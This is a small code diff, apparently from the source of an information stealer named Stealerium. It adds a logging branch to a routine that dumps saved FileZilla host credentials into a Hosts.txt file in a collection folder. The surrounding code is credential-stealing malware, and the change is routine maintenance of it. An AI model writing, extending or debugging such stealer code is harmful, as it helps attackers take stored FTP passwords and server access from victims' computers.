@@ -78,6 +78,10 @@ namespace Stealerium.Target
                     File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(p));
                 return;
             }
+            else
+            {
+                Logging.Log("FileZila >> No FileZila Hosts!\n");
+            }
 
             Directory.Delete(sSavePath);
         }
